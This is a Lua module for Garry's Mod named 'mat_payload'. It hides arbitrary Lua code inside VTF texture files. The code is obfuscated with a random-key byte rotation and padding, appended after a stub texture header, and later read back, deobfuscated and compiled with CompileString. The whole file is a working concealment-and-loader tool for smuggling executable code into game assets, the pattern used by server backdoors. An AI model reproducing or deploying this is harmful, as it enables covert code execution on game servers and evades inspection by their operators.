module( "mat_payload", package.seeall )



emptyVTF = "\x56\x54\x46\x00\x07\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x01\x00\x01\x00\x00\x03\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x3f\x00\x00\x80\x3f\x00\x00\x80\x3f\x00\x00\x00\x00\x00\x00\x80\x3f\x05\x00\x00\x00\x01\xff\xff\xff\xff\x00\x00\x01\x00"




local function rotChar177(letter_byte, addition)
	addition = addition % 177
	return (letter_byte + addition) % 177
end

local function unRotChar177(letter_byte, soustraction)
	soustraction = soustraction % 177
	return (letter_byte - soustraction) % 177
end


-- rip ram, we don't have stringBuilder here



local function obfuscatePayload(str_lua_code)
	local secretKey = math.random(10000000000000, 90000000000000)
	local key = tostring(secretKey)
	local keylen = string.len(key)
	local code_len = string.len(str_lua_code)
	local codeTBL = {string.byte(str_lua_code, 1, code_len)}
	local codedPayload = ""
	local i = 1

	while (i <= code_len) do
		local i2 = 1


		local toadd = tonumber(key[(i % (keylen - 1)) + 1])
		while (i2 <= toadd) do
			codedPayload = codedPayload .. string.char(math.random(177))
			i2 = i2 + 1
		end
		codedPayload = codedPayload .. string.char(rotChar177(codeTBL[i], secretKey))
		i = i + 1
	end
	return codedPayload, secretKey
end


local function desObfuscatePayload(obfuscated_code, key)
	local real_key = tonumber(key)
	local code_len = string.len(obfuscated_code)
	local keylen = string.len(key)
	local i = 1
	local real_i = 1
	local code = {}

	while (i <= code_len) do
		i = i + tonumber(key[(real_i % (keylen - 1)) + 1])
		code[real_i] = unRotChar177(string.byte(obfuscated_code[i]), real_key)

		real_i = real_i + 1
		i = i + 1
	end

	return string.char(unpack(code))
end


function WriteCodeToVTF(identifier, str_lua_code, custom_vtf_path)

	local base_VTF = emptyVTF
	local payload, secretKey = obfuscatePayload(str_lua_code)
	local filename = identifier .. ".vtf"


	if (custom_vtf_path) then
		base_VTF = file.Read(custom_vtf_path, "BASE_PATH")
	end
	file.Write(filename, base_VTF .. payload)

	print(string.format("Wrote to file : [garrysmod/data/%s] with secret key \"%s\", and VTF offset is %i, SAVE ALL OF THESE INFORMATIONS", filename, secretKey, string.len(base_VTF)))

end


function ReadCodeFromVTF(texture_path, secret_key, vtf_len)
	local f = file.Open(texture_path, "rb", "BASE_PATH")

	if (not f) then
		return
	end
	f:Skip(vtf_len)
	local payload = f:Read(f:Size() - vtf_len)
	f:Close()
	local code = desObfuscatePayload(payload, secret_key)
	return CompileString(code,texture_path, false)

end